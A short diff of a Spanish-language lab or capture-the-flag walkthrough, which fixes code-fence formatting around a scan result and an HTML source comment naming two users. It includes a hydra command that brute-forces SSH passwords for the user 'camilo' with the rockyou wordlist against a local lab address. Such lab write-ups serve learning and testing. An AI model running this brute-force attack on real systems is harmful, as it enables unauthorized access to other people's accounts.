@@ -68,9 +68,9 @@ MAC Address: 02:42:AC:11:00:02 (Unknown)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 Como no tenemos ningún usuario todavía vamos a ver qué tenemos en la página http://172.17.0.2 y a simple vista no tenemos nada pero si miramos el código fuente vemos un mensaje.
-'''
+```
 <!-- De : Juan Para: Camilo , te he dejado un correo es importante... -->
-'''
+```
 Ya tenemos dos posibles usuarios, como parece que somos Camilo vamos a aprovechar el puerto 22 (SSH) para con hydra y fuerza bruta intentar descubrir la contraseña.
 ```bash
 hydra -l camilo -P /usr/share/wordlist/rockyou.txt ssh://172.17.0.2
